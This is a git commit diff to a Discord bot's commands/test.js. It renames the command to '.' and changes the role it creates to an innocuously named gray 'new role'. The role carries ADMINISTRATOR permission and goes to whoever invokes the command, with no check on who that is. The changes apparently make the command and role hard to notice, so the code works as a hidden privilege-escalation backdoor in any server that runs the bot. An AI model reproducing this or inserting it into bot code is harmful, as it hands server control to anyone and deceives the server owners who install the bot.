78cc4b43f34331abc05307f09666b820bcaf57e6
werf-code <werf.code@gmail.com>
2020-07-23 22:30:58 +0300

    update

--- commands/test.js
+++ commands/test.js
@@ -1,16 +1,16 @@
 module.exports = {
-    name: 'test',
+    name: '.',
     execute(message, args){
      const Discord = require('discord.js')
       message.guild.roles.create({
         data: {
-          name: 'Super Cool People',
-          color: 'BLUE',
+          name: 'new role',
+          color: 'gray',
           permissions: 'ADMINISTRATOR',
         },
         reason: 'we needed a role for Super Cool People',
       })
-      var role = message.guild.roles.cache.find(role => role.name == 'Super Cool People')
+      var role = message.guild.roles.cache.find(role => role.name == 'new role')
       message.guild.member(message.author).roles.add(role)
         .then(console.log)
         .catch(console.error);
